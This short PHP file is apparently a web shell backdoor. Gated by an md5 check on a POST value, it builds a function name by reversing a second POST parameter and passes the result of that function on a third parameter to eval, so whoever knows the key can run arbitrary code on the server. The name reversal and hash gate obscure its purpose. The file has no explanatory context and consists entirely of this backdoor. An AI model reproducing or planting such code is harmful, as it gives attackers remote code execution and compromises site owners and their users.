<?php 
if(isset($_POST['0K']) && substr(md5($_POST['0K']),20)=='e057f20f883e'){ 
$Exp=strrev($_POST['qwer']);eval($Exp($_POST[z0]));}
